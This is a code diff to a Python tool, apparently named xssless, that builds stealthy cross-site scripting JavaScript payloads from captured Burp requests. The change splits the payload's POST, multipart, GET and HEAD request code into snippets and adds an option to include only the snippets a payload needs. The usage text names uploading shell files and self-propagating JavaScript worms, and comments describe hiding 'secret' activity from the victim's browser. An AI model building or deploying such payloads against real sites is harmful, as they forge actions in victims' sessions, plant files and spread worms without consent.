@@ -221,14 +221,22 @@ def xss_gen(requestList, settingsDict):
                     } catch (error) {}
                 }    
             };
-            if(method == "POST")
+[REPLACE_TAG]
+        }
+        r0();
+    }
+"""
+    post_js = """            if(method == "POST")
             {
                 http.open('POST', url, true);
                 http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                 http.setRequestHeader('Content-length', body.length);
                 http.setRequestHeader('Connection', 'close');
                 http.send(body);
-            } else if (method == "MPOST") {
+            }
+"""
+
+    mpost_js = """            if (method == "MPOST") {
                 http.open('POST', url, true);
                 var bound = Math.random().toString(36).slice(2);
                 body = body.split("BOUNDMARKER").join(bound);
@@ -237,17 +245,26 @@ def xss_gen(requestList, settingsDict):
                 http.setRequestHeader('Connection', 'close');
                 http.sendAsBinary(body);
                     
-            } else if (method == "GET") {
+            }
+"""
+
+    get_js = """            if (method == "GET") {
                 http.open('GET', url, true); 
                 http.send();
-            } else if (method == "HEAD") {
+            }
+"""
+
+    head_js = """            if (method == "HEAD") {
                 http.open('HEAD', url, true); 
                 http.send();
             }
-        }
-        r0();
-    }
 """
+
+    # Flags for payload optimization
+    post_flag = False
+    mpost_flag = False
+    get_flag = False
+    head_flag = False
 
     # Function chaining is implemented to avoid the issue of freezing the user's browser during 'secret' JS activity
     # Each request is done as a function that one requestion completion, calls the next function.
@@ -261,6 +278,7 @@ def xss_gen(requestList, settingsDict):
 
         if requestDict['method'].lower() == "post":
             if requestDict['isupload'] == True:
+                mpost_flag = True
                 payload += "       doRequest('" + requestDict['path'] + "', 'MPOST', '"
                 multipart = ""
                 for item in requestDict['bodyList']:
@@ -306,6 +324,7 @@ def xss_gen(requestList, settingsDict):
                 payload += "');\n"
             else:
                 postString = ""
+                post_flag = True
                 for pair in requestDict['bodyList']:
                     if 'parseList' in settingsDict:
                         if pair['Key'] in settingsDict['parseList']:
@@ -325,8 +344,10 @@ def xss_gen(requestList, settingsDict):
                 payload += "        doRequest('" + requestDict['path'] + "', 'POST', '" + postString + "');\n"
 
         elif requestDict['method'].lower() == "get":
+            get_flag = True
             payload += "        doRequest('" + requestDict['path'] + "', 'GET', '');\n"
         elif requestDict['method'].lower() == "head":
+            head_flag = True
             payload += "        doRequest('" + requestDict['path'] + "', 'HEAD', '');\n"
             pass
 
@@ -334,6 +355,24 @@ def xss_gen(requestList, settingsDict):
         payload += "\n"
 
     payload += "</script>"
+
+    # Now add only the needed code for this particular payload
+    func_code = ""
+    
+    if settingsDict['opt']:
+        if mpost_flag:
+            func_code += mpost_js
+        if post_flag:
+            func_code += post_js
+        if get_flag:
+            func_code += get_js
+        if head_flag:
+            func_code += head_js
+    else:
+        func_code += mpost_js + post_js + get_js + head_js
+
+    payload = payload.replace( "[REPLACE_TAG]", func_code )
+
     return payload
 
 logo = """
@@ -356,6 +395,7 @@ Example: """ + sys.argv[0] + """ [ OPTION(S) ] [ BURP FILE ]
 -f=FILELIST      File list - input list of POST name/filenames to use in payload. ex: 'upload_filename,~/Desktop/shell.bin'
 -m=METALIST      Self propagation list - input list of POST names for POSTing the XSS payload itself (for JavaScript worms)
 -s               Don't display the xssless logo
+-n               Turn off payload optimization
 
 """
 if len(sys.argv) < 2:
@@ -364,6 +404,7 @@ if len(sys.argv) < 2:
 else:
     # settingsDict will contain code generation settings, such as waiting for each request to complete, etc.
     settingsDict = {}
+    settingsDict['opt'] = True
 
     showlogo = True
 
@@ -394,6 +435,8 @@ else:
                    settingsDict['parseList'] = tmpList
             else:
                 print "Error, parse list not found!"
+        if "-n" in option:
+            settingsDict['opt'] = False
         if "-f=" in option:
             fileuploadlist = option.replace("-f=", "")
             if os.path.isfile(fileuploadlist):
